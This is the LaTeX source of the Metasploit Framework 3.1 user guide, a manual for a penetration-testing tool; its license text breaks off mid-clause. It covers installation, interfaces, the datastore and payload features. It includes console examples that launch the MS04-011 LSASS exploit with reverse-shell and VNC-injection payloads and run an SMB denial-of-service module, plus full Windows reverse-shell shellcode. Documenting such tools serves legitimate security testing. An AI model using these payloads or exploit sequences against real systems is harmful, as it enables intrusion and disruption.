%%
% This file is part of the Metasploit Framework.
%%

%
%   Title: Metasploit Framework User Guide
% Version: $Revision: 4068 $
%

\documentclass{report}
\usepackage{graphicx}
\usepackage{color}
\usepackage{amsmath}
\usepackage[colorlinks,urlcolor=blue,linkcolor=black,citecolor=blue]{hyperref}

\begin{document}

\title{Metasploit Framework User Guide}
\author{metasploit.com}

\begin{titlepage}
    \begin{center}
        		
        \huge{Metasploit Framework User Guide}
		\ \\[10mm]
		\large{Version 3.1}
		\\[120mm]
		
        \small{\url{http://www.metasploit.com/}}

        \rule{10cm}{1pt} \\[4mm]
        \renewcommand{\arraystretch}{0.5}
    \end{center}
\end{titlepage}

\tableofcontents

\setlength{\parindent}{0pt} \setlength{\parskip}{8pt}


\chapter{Introduction}

\par
This is the official user guide for version 3.1 of the Metasploit Framework. This 
guide is designed to provide an overview of what the framework is, how it works,
and what you can do with it. The latest version of this document can be found
on the Metasploit Framework web site. 

\par
The Metasploit Framework is a platform for writing, testing, and using exploit code.
The primary users of the Framework are professionals performing penetration testing,
shellcode development, and vulnerability research.

\par
\pagebreak

\chapter{Installation}

    \section{Installation on Unix}
    \label{INSTALL-UNIX}
\par
Installing the Framework is as easy as extracting the tarball, changing into the
created directory, and executing your preferred user interface. We strongly
recommend that you use a version of the Ruby interpreter that was built with
support for the GNU Readline library. If you are using the Framework on Mac OS
X prior to 10.5.1, you will need to install GNU Readline and then recompile the Ruby
interpreter.  Using a version of Ruby with Readline support enables tab completion
of the console interface.  The \texttt{msfconsole} user interface is preferred for everyday
use, but the \texttt{msfweb} interface can be useful for live demonstrations.

\par
To perform a system-wide installation, we recommend that you copy the entire
Framework directory into a globally accessible location (/usr/local/msf) and
then create symbolic links from the msf* applications to a directory in the
system path (/usr/local/bin). User-specific modules can be placed into
\texttt{HOME/.msf3/modules} directory.  The structure of this directory should
mirror that of the global modules directory found in the framework
distribution.

    \section{Installation on Windows}
    \label{INSTALL-WIN32}

\par
The Metasploit Framework is fully supported on the Windows platform. To install the Framework on Windows, 
download the latest version of the Windows installer from \url{http://framework.metasploit.com/}, perform 
an online update, and launch the \texttt{msfgui} interface from the Start Menu. To access a standard
\texttt{msfconsole} interface, select the Console option from the Window menu. As an alternative, you can
use the \texttt{msfweb} interface, which supports Mozilla Firefox and Internet Explorer.


    \section{Platform Caveats}
    \label{INSTALL-CAVEAT}

\par
When using the Framework on the Windows platform, keep in mind that \texttt{msfgui} and \texttt{msfweb} are the only
supported user interfaces. While \texttt{msfcli} may appear to work on the command line, it will will run into
trouble as soon as more than one active thread is present. This can prevent most exploits, auxiliary modules,
and plugins from functioning. This problem does not occur within Cygwin environment.

    \section{Supported Operating Systems}
    \label{INSTALL-SUPPORT}

\par
The Framework should run on almost any Unix-based operating system that includes
a complete and modern version of the Ruby interpreter (1.8.4+). Every stable
version of the Framework is tested with three primary platforms: 

\begin{itemize}
\item Linux 2.6 (x86, ppc)
\item Windows NT (2000, XP, 2003, Vista)
\item MacOS X 10.4 (x86, ppc), 10.5 (x86)
\end{itemize}

\par
For information about manually installing the framework, including all of the required dependencies needed
to use the new \texttt{msfgui} interface, please see the framework web site: \url{http://framework.metasploit.com/msf/support}

    \section{Updating the Framework}
    \label{INSTALL-UPDATE}

\par
The Framework can be updated using a standard \texttt{Subversion} client. The
old \texttt{msfupdate} tool is no longer supported. Windows users can click on
the Online Update link within the Metasploit 3 program folder on the Start Menu.
To obtain the latest updates on a Unix-like platform, change into the Framework 
installation directory and execute \texttt{svn update}. If you are accessing the
internet through a HTTP proxy server, please see the Subversion FAQ on proxy 
access: \url{http://subversion.tigris.org/faq.html#proxy}

\pagebreak

\chapter{Getting Started}

    \section{The Console Interface}
    \label{STARTED-CONSOLE}

\par
After you have installed the Framework, you should verify that everything is
working properly  The easiest way to do this is to execute the
\texttt{msfconsole} user interface. If you are using Windows, start the \texttt{msfgui}
interface and access the \texttt{Console} link from the Window menu.
The console should display an ASCII art logo, print the current version, some module
counts, and drop to a "msf> " prompt. From this prompt, type \texttt{help} to get a list of
valid commands. You are currently in the "main" mode; this allows you to list
exploits, list payloads, and configure global options.  To list all available
exploits, type \texttt{show exploits}. To obtain more information about a given
exploit, type \texttt{info module\_name}. 

\par
The console interface was designed to be flexible and fast. If you
enter a command that is not recognized by the console, it will scan the system
path to determine if it is a system command. \footnote{If you are accessing the console
through \texttt{msfweb}, this feature has been disabled for security reasons.}
If it finds a match, that command will be executed with the supplied arguments. This allows you to use
your standard set of tools without having to leave the console. The console interface
supports tab completion of known commands. The \texttt{msfweb} interface
includes tab completion by default, but the \texttt{msfconsole} interface requires that 
Ruby was built with the Readline library. For more information on tab completion, please
refer to appendix \ref{REF-TAB}.

\par
The console startup will similar to the text below.

\begin{verbatim}



                 o                       8         o   o
                 8                       8             8
ooYoYo. .oPYo.  o8P .oPYo. .oPYo. .oPYo. 8 .oPYo. o8  o8P
8' 8  8 8oooo8   8  .oooo8 Yb..   8    8 8 8    8  8   8
8  8  8 8.       8  8    8   'Yb. 8    8 8 8    8  8   8
8  8  8 `Yooo'   8  `YooP8 `YooP' 8YooP' 8 `YooP'  8   8
..:..:..:.....:::..::.....::.....:8.....:..:.....::..::..:
::::::::::::::::::::::::::::::::::8:::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


       =[ msf v3.1-release
+ -- --=[ 263 exploits - 116 payloads
+ -- --=[ 17 encoders - 6 nops
       =[ 45 aux

msf >            
\end{verbatim}

    \section{The GUI Interface}
    \label{STARTED-GUI}

\par
The \texttt{msfgui} interface was introduced in version 3.1 and provides the functionality
of \texttt{msfconsole} in addition to many new features. To access a \texttt{msfconsole}
shell, select the Console option from the Window menu. To search for a module within the
module tree, enter a string or regular expression into the search box and click the button
labeled Find. All matching modules will appear the tree below. To execute a module, 
double-click its name in the tree, or right-click its name and select the Execute option.
To view the source code of any module, right-click its name and select the View Code option.

\par
Once a module is selected, a wizard-based interface will walk you through the process of
configuring and launching the module. In the case of exploit modules, the output from
the module will appear in the main window under the Module Output tab. Any sessions created
by the module will appear in the Sessions view in the main window. To access a session,
double-click the session name in the view, or open a Console and use the \texttt{sessions}
command to interact with the shell. Metepreter sessions will spawn a shell when double-clicked,
but also offer a process and file browser via the right-click context menu. 


    \section{The Command Line Interface}
    \label{STARTED-CLI}

\par
If you are looking for a way to automate exploit testing, or simply do not want
to use an interactive interface, then \texttt{msfcli} may be the solution.
\footnote{The msfcli interface will not work properly with the native Windows version of Ruby}
This interface takes a module name as the first parameter, followed by the options
in a VAR=VAL format, and finally an action code to specify what should be done.
The module name is used to determine which exploit or auxiliary module you
want to launch.

\par
The action code is a single letter; S for summary, O for options, A for advanced
options, I for IDS evasions, P for payloads, T for targets, AC for auxiliary
actions, C to try a vulnerability check, and E to exploit. The saved
datastore will be loaded and used at startup, allowing you to configure
convenient default options in the Global or module-specific datastore of
\texttt{msfconsole}, save them, and take advantage of them in the
\texttt{msfcli} interface. As of version 3.1, the \texttt{msfcli} interface
will also work with auxiliary modules.

    \section{The Web Interface}
    \label{STARTED-WEB}

\par
The \texttt{msfweb} interface is based on Ruby on Rails. To access this interface,
execute \texttt{msfweb} to start up the server. The \texttt{msfweb}
interface uses the WEBrick web server to handle requests. By default, \texttt{msfweb} will listen
on the loopback address (127.0.0.1) on port 55555. A log message should be displayed indicating that
the service has started. To access the interface, open your browser to the appropriate URL 
(\url{http://127.0.0.1:55555/} by default). The main \texttt{msfweb} interface consists of a toolbar
containing various icons and a background with the metasploit logo. If you want access to a console, 
click the Console link. This console interface is nearly identical to the standard 
\texttt{msfconsole} interface. The Exploits, Auxiliary, and Payloads links will walk you through 
the process of selecting a module, configuring it, and running it. Once an exploit is run and
a session is created, you can access these sessions from the Sessions link. These icons will open up
a sub-window within the page. These windows can be moved, minimized, maximized, and closed.

\pagebreak
\chapter{The DataStore}

\par
The datastore system is a core component of the Framework.  The interfaces use
it to configure settings, the payloads use it patch opcodes, the exploits
use it to define parameters, and it is used internally to pass options between
modules.  There are two types of datastores.  First, there is a single global
datastore that can be accessed using the \texttt{setg} and \texttt{unsetg}
commands from \texttt{msfconsole}.  Second, each module instance has its own
datastore in which arbitrary options or parameters can be stored.  For
example, when the \texttt{RHOST} option is set, its value is stored in the
datastore of the module instance that it was set relative to.  In the event
that an option was not set in a module instance's datastore, the framework
will consult the global datastore to see if it was set there.

    \section{Global DataStore}
    \label{ENV-GLOBAL}
\par
The Global datastore is accessed through the console via the \texttt{setg} and
\texttt{unsetg} commands. The following example shows the Global datastore
state after a fresh installation. Calling \texttt{setg} with no arguments
displays the current global datastore. Default settings are automatically
loaded when the interface starts.

\begin{verbatim}
msf > setg

Global
======

No entries in data store.

\end{verbatim}

    \section{Module DataStore}
    \label{ENV-TEMP}
\par

The module datastore is accessed through the \texttt{set} and \texttt{unset}
commands. This datastore only applies to the currently loaded module;
switching to another module via the \texttt{use} command will result in the
module datastore for the current module being swapped out with the datastore
of the new module. If no module is currently active, the \texttt{set} and
\texttt{unset} commands will operate on the global datastore. Switching back
to the original module will initialize a new datastore for the module.  To
persist the contents of either the global or module-specific datastores, the
\texttt{save} command should be used.

    \section{Saved DataStore}
    \label{ENV-SAVE}

\par
The \texttt{save} command can be used to synchronize the Global and all module
datastores to disk. The saved environment is written to
\texttt{HOME/.msf3/config} and will be loaded when any of the user interfaces
are executed.  

    \section{DataStore Efficiency}
    \label{ENV-EFF}

\par
This split datastore system allows you save time during exploit development
and penetration testing. Common options between exploits can be defined in the
Global datastore once and automatically used in any exploit you load thereafter.  

\par
The example below shows how the \texttt{LPORT}, \texttt{LHOST}, and
\texttt{PAYLOAD} global datastore can be used to save time when exploiting a
set of Windows-based targets. If this datastore was set and a Linux exploit
was being used, the module datastore (via \texttt{set} and \texttt{unset})
could be used to override these defaults.  

{\footnotesize
\begin{verbatim}
f > setg LHOST 192.168.0.10
LHOST => 192.168.0.10
msf > setg LPORT 4445
LPORT => 4445
msf > setg PAYLOAD windows/shell/reverse_tcp
PAYLOAD => windows/shell/reverse_tcp
msf > use windows/smb/ms04_011_lsass
msf exploit(ms04_011_lsass) > show options

Module options:

...

Payload options:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST     192.168.0.10     yes       The local address
   LPORT     4445             yes       The local port

...

\end{verbatim}}

    \section{DataStore Variables}
    \label{ENV-VAR}
\par
The datastore can be used to configure many aspects of the Framework, ranging
from user interface settings to specific timeout options in the network socket
API. This section describes the most commonly used environment variables.  

\par
For a complete listing of all environment variables, please see the file
Environment.txt in the ``documentation'' subdirectory of the Framework. 

	\subsection{LogLevel}
\par
This variable is used to control the verbosity of log messages provided
by the components of the Framework.  If this variable is not set, framework
logging is disabled.  Setting this variable to 0 will turn on default log
messages.  A value of 1 will enable additional, non-verbose log messages that
may be helpful in troubleshooting.  A value of 2 will enable verbose debug
logging.  A value of 3 will enable all logging and may generate a large amount
of log messages.  Only use this when much additional information is required.
Log files are stored in the logs subdirectory of the user's configuration
directory (~/.msf3/logs). Unlike version 2 of the framework, debugging
messages are never written directly to the console.

	\subsection{MsfModulePaths}
\par
This variable can be used to add additional paths from which to load modules.
By default, the framework will load modules from the modules directory found
within the framework install.  It will also load modules from ~/.msf3/modules
if such a path exists.  This variable makes it possible to statically define
additional paths from which to load modules.

\pagebreak

\chapter{Using the Framework}

	\section{Choosing a Module}
\par
From the \texttt{msfconsole} interface, you can view the list of modules that
are available for you to interact with.  You can see all available modules
through the \texttt{show all} command.  To see the list of modules of a
particular type you can use the \texttt{show moduletype} command, where
\textit{moduletype} is any one of exploits, encoders, payloads, and so on.  
You can select a module with the \texttt{use} command by specifying the
module's name as the argument.  The \texttt{info} command can be used to view
information about a module without using it.  Unlike Metasploit 2.x, the new
version of Metasploit supports interacting with each different module types
through the \texttt{use} command.  In Metasploit 2.x, only exploit modules
could be interacted with.

	\section{Exploit Modules}

\par
Exploit modules are the defacto module in Metasploit which are used to
encapsulate an exploit.

		\subsection{Configuring the Active Exploit}

\par 
Once you have selected an exploit with the \texttt{use} command, the next step
is to determine what options it requires. This can be accomplished with the
\texttt{show options} command. Most exploits use \texttt{RHOST} to specify the
target address and \texttt{RPORT} to set the target port. Use the \texttt{set}
command to configure the appropriate values for all required options. If you
have any questions about what a given option does, refer to the module source
code.  Advanced options are available with some exploit modules, these can be
viewed with the \texttt{show advanced} command. Options useful for IDS and IPS
evasion can be viewed with the \texttt{show evasion} command.

		\subsection{Verifying the Exploit Options}

\par	
The \texttt{check} command can be used to determine whether the target
system is vulnerable to the active exploit module. This is a quick way to
verify that all options have been correctly set and that the target is
actually vulnerable to exploitation. Not all exploit modules have implemented
the check functionality.  In many cases it is nearly impossible to determine
whether a service is vulnerable without actually exploiting it. A
\texttt{check} command should never result in the target system crashing or
becoming unavailable. Many modules display version information and
expect you to analyze it before proceeding.  

		\subsection{Selecting a Target}

\par Many exploits will require the \texttt{TARGET} environment variable to be
set to the index number of the desired target. The \texttt{show targets}
command will list all targets provided by the exploit module. Many exploits
will default to a brute-force target type; this may not be desirable in all
situations. 

		\subsection{Selecting the Payload}

\par	The payload is the actual code that will run on the target system after
a successful exploit attempt. Use the \texttt{show payloads} command to list
all payloads compatible with the current exploit. If you are behind a
firewall, you may want to use a bind shell payload, if your target is behind
one and you are not, you would use a reverse connect payload. You can use the
\texttt{info payload\_name} command to view detailed information about a given
payload.  

\par
Once you have decided on a payload, use the \texttt{set} command to specify
the payload module name as the value for the \texttt{PAYLOAD} environment
variable. Once the payload has been set, use the \texttt{show options} command
to display all available payload options. Most payloads have at least one
required option. Advanced options are provided by a handful of payload
options; use the \texttt{show advanced} command to view these. Please keep in
mind that you will be allowed to select any payload compatible with that
exploit, even if it not compatible with your currently selected
\texttt{TARGET}. For example, if you select a Linux target, yet choose a BSD
payload, you should not expect the exploit to work.

		\subsection{Launching the Exploit}

\par The \texttt{exploit} command will launch the attack. If everything went
well, your payload will execute and potentially provide you with an
interactive command shell on the exploited system. 

	\section{Auxiliary Modules}

\par
Metasploit 3.0 supports the concept of auxiliary modules which can be used to
perform arbitrary, one-off actions such as port scanning, denial of service,
and even fuzzing.
	
		\subsection{Running an Auxiliary Task}

\par
Auxiliary modules are quite a bit similar to exploit modules.  Instead of
having targets, they have actions, which are specified through the
\texttt{ACTION} option.  To run an auxiliary module, you can either use the
\texttt{run} command, or you can use the \texttt{exploit} command -- they're
both the same thing.

\begin{verbatim}
msf > use dos/windows/smb/ms06_035_mailslot
msf auxiliary(ms06_035_mailslot) > set RHOST 1.2.3.4
RHOST => 1.2.3.4
msf auxiliary(ms06_035_mailslot) > run
[*] Mangling the kernel, two bytes at a time...
\end{verbatim} 

	\section{Payload Modules}

\par
Payload modules encapsulate the arbitrary code (shellcode) that is executed as
the result of an exploit succeeding.  Payloads typically build a communication
channel between Metasploit and the victim host.

		\subsection{Generating a Payload}

\par
The console interface supports generating different forms of a payload.  This
is a new feature in Metasploit 3.0.  To generate payloads, first select a
payload through the \texttt{use} command.

\begin{verbatim}
msf > use windows/shell_reverse_tcp
msf payload(shell_reverse_tcp) > generate -h
Usage: generate [options]

Generates a payload.

OPTIONS:

    -b <opt>  The list of characters to avoid: '\x00\xff'
    -e <opt>  The name of the encoder module to use.
    -h        Help banner.
    -o <opt>  A comma separated list of options in VAR=VAL format.
    -s <opt>  NOP sled length.
    -t <opt>  The output type: ruby, perl, c, or raw.

msf payload(shell_reverse_tcp) >  
\end{verbatim}

\par
Using the options supported by the \texttt{generate} command, different
formats of a payload can be generated.  Some payloads will require options
which can be specified through the \texttt{-o} parameter.  Additionally, a
format to convey the generated payload can be specified through the
\texttt{-t} parameter. To save the resulting data to a local file, pass the
\texttt{-f} parameter followed by the output file name.

\begin{verbatim}
msf payload(shell_reverse_tcp) > set LHOST 1.2.3.4
LHOST => 1.2.3.4
msf payload(shell_reverse_tcp) > generate -t ruby
# windows/shell_reverse_tcp - 287 bytes
# http://www.metasploit.com
# EXITFUNC=seh, LPORT=4444, LHOST=1.2.3.4
"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24" +
"\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f" +
"\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84" +
"\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28" +
"\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c" +
"\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64" +
"\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\x5e" +
"\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" +
"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50" +
"\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff" +
"\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43" +
"\x53\x43\x53\xff\xd0\x68\x01\x02\x03\x04\x66\x68\x11\x5c" +
"\x66\x53\x89\xe1\x95\x68\xec\xf9\xaa\x60\x57\xff\xd6\x6a" +
"\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68\x63\x6d\x6a\x50" +
"\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3\xaa\x95" +
"\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab" +
"\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51" +
"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05" +
"\xce\x53\xff\xd6\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6" +
"\x79\xff\x75\x04\xff\xd6\xff\x77\xfc\xff\xd0\x68\xf0\x8a" +
"\x04\x5f\x53\xff\xd6\xff\xd0"
msf payload(shell_reverse_tcp) >  
\end{verbatim}

	\section{Nop Modules}

\par
NOP modules are used to generate no-operation instructions that can be used
for padding out buffers.

		\subsection{Generating a NOP Sled}

\par
The NOP module console interface supports generating a NOP sled of an
arbitrary size and displaying it in a given format through the
\texttt{generate} command.

\begin{verbatim}
msf > use x86/opty2
msf nop(opty2) > generate -h
Usage: generate [options] length

Generates a NOP sled of a given length.

OPTIONS:

    -b <opt>  The list of characters to avoid: '\x00\xff'
    -h        Help banner.
    -s <opt>  The comma separated list of registers to save.
    -t <opt>  The output type: ruby, perl, c, or raw.

msf nop(opty2) >     
\end{verbatim}

\par
To generate a 50 byte NOP sled that is displayed as a C-style buffer, the
following command can be run:

\begin{verbatim}
msf nop(opty2) > generate -t c 50
unsigned char buf[] =
"\xf5\x3d\x05\x15\xf8\x67\xba\x7d\x08\xd6\x66\x9f\xb8\x2d\xb6"
"\x24\xbe\xb1\x3f\x43\x1d\x93\xb2\x37\x35\x84\xd5\x14\x40\xb4"
"\xb3\x41\xb9\x48\x04\x99\x46\xa9\xb0\xb7\x2f\xfd\x96\x4a\x98"
"\x92\xb5\xd4\x4f\x91";
msf nop(opty2) >   
\end{verbatim}

\pagebreak
\chapter{Advanced Features}

\par
This section covers some of the advanced features that can be found in this
release. These features can be used in any compatible exploit and highlight
the strength of developing attack code using an exploit framework. 

\section{The Meterpreter}
\par
The Meterpreter is an advanced multi-function payload that can be dynamically
extended at run-time. In normal terms, this means that it provides you with a
basic shell and allows you to add new features to it as needed. Please refer
to the Meterpreter documentation for an in-depth description of how it works
and what you can do with it. The Meterpreter manual can be found in the
``documentation'' subdirectory of the Framework as well as online at:

\url{http://metasploit.com/projects/Framework/docs/meterpreter.pdf}

\section{PassiveX Payloads}

\par The Metasploit Framework can be used to
load arbitrary ActiveX controls into a target process. This feature works by
patching the registry of the target system and causing the exploited process
to launch internet explorer with a URL pointing back to the Framework. The
Framework starts up a simple web server that accepts the request and sends
back a web page instructing it to load an ActiveX component. The exploited
system then downloads, registers, and executes the ActiveX. 

\par
The basic PassiveX payload, \texttt{windows/xxx/reverse\_http}, supports any
custom ActiveX that you develop. In addition to the base payload, three other
PassiveX modules are included in the Framework. These can be used to execute a
command shell, load the Meterpreter, or inject a VNC service. When any of
these three payloads are used, the PassiveX object will emulate a TCP
connection through HTTP GET and POST requests. This allows you to interact
with a command shell, VNC, or the Meterpreter using nothing but standard HTTP
traffic.

\par
Since PassiveX uses the Internet Explorer browser to load the ActiveX
component, it will pass right through an outbound web proxy, using whatever
system and authentication settings that have already been configured. The
PassiveX payloads will only work when the target system has Internet Explorer
6.0 installed (not 5.5 or 7.0). For more information about PassiveX,
please see the Uninformed Journal article titled "Post-Exploitation on Windows
using ActiveX Controls", located online at:

\url{http://www.uninformed.org/?v=1&a=3&t=pdf}

\section{Chainable Proxies}
\par
The Framework includes transparent support for TCP proxies, this release has
handler routines for HTTP CONNECT and SOCKSv4 servers. To use a proxy with a
given exploit, the \texttt{Proxies} environment variable needs to be set. The value of
this variable is a comma-separated list of proxy servers, where each server is
in the format type:host:port. The type values are 'http' for HTTP CONNECT and
'socks4' for SOCKS v4. The proxy chain can be of any length; testing shows that
the system was stable with over five hundred SOCKS and HTTP proxies configured
randomly in a chain. The proxy chain only masks the exploit request, the
automatic connection to the payload is not relayed through the proxy chain at
this time. 

\section{Win32 UploadExec Payloads}
\par
Although Unix systems normally include all of the tools you need for
post-exploitation, Windows systems are notoriously lacking in a decent command
line toolkit. The windows/upexec/* payloads included in this release allow you to
simultaneously exploit a Windows system, upload your favorite tool, and execute
it, all across the payload socket connection. When combined with a
self-extracting rootkit or scripting language interpreter (perl.exe!), this can
be a very powerful feature. The Meterpreter payloads are usually much better
suited for penetration testing tasks.  

\section{Win32 DLL Injection Payloads}
\par
The Framework includes a staged payload that is
capable of injecting a custom DLL into memory in combination with any Win32
exploit. This payload will not result in any files being written to disk; the
DLL is loaded directly into memory and is started as a new thread in the
exploited process. This payload was developed by Jarkko Turkulainen and Matt
Miller and is one of the most powerful post-exploitation techniques developed
to date. To create a DLL which can be used with this payload, use the
development environment of choice and build a standard Win32 DLL. This DLL
should export an function called Init which takes a single argument, an
integer value which contains the socket descriptor of the payload connection.
The Init function becomes the entry point for the new thread in the exploited
process. When processing is complete, it should return and allow the loader
stub to exit the process according to the \texttt{EXITFUNC} environment
variable. If you would like to write your own DLL payloads, refer to the
external/source/dllinject directory in the Framework. 

\section{VNC Server DLL Injection}
\par
One of the first DLL injection payloads developed was a customized VNC server.
This server was written by Matt Miller and based on the RealVNC source code.
Additional modifications were made to allow the server to work with exploited,
non-interactive network services. This payload allows you to immediately access
the desktop of an exploited system using almost any Win32 exploit. The DLL is
loaded into the remote process using any of the staged loader systems, started
up as a new thread in the exploited process, and the listens for VNC client
requests on the same socket used to load the DLL. The Framework listens
on a local socket for a VNC client and proxies data across the payload
connection to the server.  

\par
The VNC server will attempt to obtain full access to the current interactive
desktop. If the first attempt fails, it will call RevertToSelf() and then try
the attempt again. If it still fails to obtain full access to this desktop, it
will fall back to a read-only mode. In read-only mode, the Framework user can
view the contents of the desktop, but not interact with it. If full access was
obtained, the VNC server will spawn a command shell on the desktop with the
privileges of the exploited service. This is useful in situations where an
unprivileged user is on the interactive desktop, but the exploited service is
running with System privileges.  

\par
If there is no interactive user logged into the system or the screen has been
locked, the command shell can be used to launch explorer.exe anyways. This can
result in some very confused users when the logon screen also has a Start Menu.
If the interactive desktop is changed, either through someone logging into the
system or locking the screen, the VNC server will disconnect the client. Future
versions may attempt to follow a desktop switch. 

\par
To use the VNC injection payloads, specify the full path to the VNC server as
the value of the \texttt{DLL} option. The VNC server can be found in the data
subdirectory of the Framework installation and is named 'vncdll.dll'. The source
code of the DLL can be found in the external/source/vncdll
subdirectory of the Framework installation. 

\par
There are a few situations where the VNC inject payload
will simply not work. These problems are often cause by strange execution
environments or other issues related to a specific exploit or injection method.
These issues will be addressed as time permits:
\begin{itemize}
	\item The windows/brightstor/universal\_agent exploit will cause the VNC payload to
	crash, possibly due to a strange heap state.
\end{itemize}

\begin{verbatim}
msf > use windows/smb/ms04_011_lsass
msf exploit(ms04_011_lsass) > set RHOST some.vuln.host
RHOST => some.vuln.host
msf exploit(ms04_011_lsass) > set PAYLOAD windows/vncinject/reverse_tcp
PAYLOAD => windows/vncinject/reverse_tcp
msf exploit(ms04_011_lsass) > set LHOST your.own.ip
LHOST => your.own.ip
msf exploit(ms04_011_lsass) > set LPORT 4321
LPORT => 4321
msf exploit(ms04_011_lsass) > exploit
\end{verbatim}

If the "vncviewer" application is in your path and the AUTOVNC option has been
set (it is by default), the Framework will automatically open the VNC desktop.
If you would like to connect to the desktop manually, \texttt{set AUTOVNC 0}, then use
vncviewer to connect to 127.0.0.1 on port 5900. 

\pagebreak
\chapter{More Information}


\section{Web Site}
\par
The metasploit.com web site is the first place to check for updated modules and
new releases. This web site also hosts the Opcode Database and a decent shellcode
archive.  

\section{Mailing List}
\par
You can subscribe to the Metasploit Framework mailing list by sending a blank
email to framework-subscribe[at]metasploit.com. This is the preferred way to
submit bugs, suggest new features, and discuss the Framework with other users.
The mailing list archive can be found online at:
\url{http://metasploit.com/archive/framework/threads.html}

\section{Developers}
\par
If you are interested in helping out with the Framework project, or have any
questions related to module development, please contact the development team. The
Metasploit Framework development team can be reached at msfdev[at]metasploit.com.

\pagebreak
\appendix

\pagebreak
\chapter{Security}

\par
We recommend that you use a robust, secure terminal emulator when
utilizing the command-line interfaces. Examples include \texttt{konsole},
\texttt{gnome-terminal}, and recent versions of \texttt{PuTTY}.

\par
We do not recommend that the \texttt{msfweb} interface be used on untrusted
networks. 

	\section{Console Interfaces}
\par
The console does not perform terminal escape sequence filtering, this
could allow a hostile network service to do Bad Things (TM) to your terminal
emulator when the exploit or check commands are used. We suggest that you
use a terminal emulator which limits the functionality available through
hostile escape sequences. Please see the Terminal Emulator Security Issues paper
below for more information on this topic:

\url{http://marc.info/?l=bugtraq&m=104612710031920&q=p3}


	\section{Web Interface}
\par
The \texttt{msfweb} interface does not adequately filter certain arguments,
allowing a hostile web site operator to perform a cross-site scripting
attack on the \texttt{msfweb} user.

\par
The \texttt{msfweb} interface does not provide any access control functionality. If
the service is configured to listen on a different interface (default is
loopback), a malicious attacker could abuse this to exploit remote systems
and potentially access local files. The local file access attack can be
accomplished by malicious arguments to the payloads which use a local file
as input and then exploiting a (fake) service to obtain the file contents.
	

\pagebreak
\chapter{General Tips}

	\section{Tab Completion}
	\label{REF-TAB}
\par
On the Unix and Cygwin platforms, tab completion depends on the existence of the Readline 
library when Ruby was compiled. Some operating systems, such as Mac OS X, have included
a version of Ruby without this support. To solve this problem, grab the latest version
of the Readline library, configure, build, and install it. Then grab the latest version
of the Ruby interpreter and do the same. The resulting Ruby binary can be used to start the
\texttt{msfconsole} interface with full tab completion support.


	\section{Secure Socket Layer}
	\label{REF-SSL}
\par
Nearly all TCP-based exploit and auxiliary modules have builtin support for the Secure Socket Layer.
This is a feature of the Socket class included with the Rex library. To indicate that all connections
should use SSL, set the \texttt{SSL} environment variable to \texttt{true} from within the Framework
interface. Keep in mind, that in most cases the default \texttt{RPORT} variable will need to be 
changed as well. For example, when exploiting a web application vulnerability through SSL, the
\texttt{RPORT} value should be set to \texttt{443}.

\pagebreak
\chapter{Licenses}

\par
The Metasploit Framework is distributed under the Metasploit Framework License
v1.2 or later.  This license is included below:

{\footnotesize
\begin{verbatim}
The Metasploit Framework License v1.2

Copyright (C) 2006 METASPLOIT.COM


This License governs your use of the Software and any accompanying 
materials distributed with this License. By clicking "ACCEPT" at the end 
of this License, you are indicating that you have read and understood, 
and assent to be bound by, the terms of this License. You must accept 
the terms of this License before using the Software. If you are an 
individual working for a company, you represent and warrant that you have 
all necessary authority to bind your company to the terms and conditions 
of this License. 

If you do not agree to the terms of this License, you are not granted any 
rights whatsoever in the Software or Documentation. If you are not 
willing to be bound by these terms and conditions, do not download the 
Software.


Definitions

a. "License" means this particular version of this document (or, where 
specifically indicated, a successor iteration of this License officially 
issued by the Developer). 

b. "Software" means any software that is distributed under the terms of 
this License, in both object code and source code. 

c. "Enhancement" means any bug fix, error correction, patch, or other 
addition to the Software that are independent of the Software and do not 
require modification of the Software of the Software itself.

d. "Extension" means any external software program or library that 
interfaces with the Software and does not [reproduce or require 
modification of the Software itself]. "Extension" includes any module or 
plug-in that is intended (by design and coding) to, or can, be 
dynamically loaded by the Software. 

e. "Developer" means the then-current copyright holder(s) of the Software, 
including, but not limited to, the Metasploit personnel and any 
third-party contributors (or their successor(s) or transferee(s)). 

f. "Documentation" means any and all end user, technical/programmer, 
network administrator, or other manuals, tutorials, or code samples 
provided or offered by Developer with the Software, excluding those items 
created by someone other than the Developer. 

g. "Use" means to download, install, access, copy, execute, sell, or 
otherwise benefit from the Software (directly or indirectly, with or 
without notice or knowledge of the Software's incorporation or 
utilization in any larger application or product).

h. "You" means the individual or organization that is using the Software 
under the License. 

i. "Interface" means to execute, parse, or otherwise benefit from the use 
of the Software. 


License Grant and Restrictions

1. Provided that You agree to, and do, comply with all terms and 
conditions in this License, You are granted the non-exclusive rights 
specified in this License. Your Use of any of the Software in any form 
and to any extent signifies acceptance of this License. If You do not 
agree to all of these terms and conditions, then do not use the Software 
and immediately remove all copies of the Software, the Documentation, and 
any other items provided under the License. 


2. Subject to the terms and conditions of this License, Developer hereby 
grants You a worldwide, royalty-free, non-exclusive license to reproduce, 
publicly display, and publicly perform the Software.


3. The license granted in Section 2 is expressly made subject to and 
limited by the following restrictions: 

